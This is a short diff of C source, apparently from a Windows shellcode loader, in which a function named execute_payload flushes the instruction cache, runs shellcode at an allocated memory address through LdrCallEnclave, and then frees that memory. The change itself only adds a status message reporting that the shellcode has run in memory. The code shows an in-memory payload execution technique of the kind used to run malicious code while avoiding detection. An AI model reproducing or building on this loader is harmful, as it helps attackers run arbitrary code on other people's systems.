@@ -138,7 +138,7 @@ void execute_payload() {
     printf("[+] Instruction cache flushed\n");
     PVOID dummy_param = NULL;
     LdrCallEnclave((PENCLAVE_ROUTINE)shellcode_addr, 0, &dummy_param);
-    
+    printf("[!] Shellcode executed in memory\n");
     if (allocated) {
         VirtualFree(shellcode_addr, 0, MEM_RELEASE);
     }
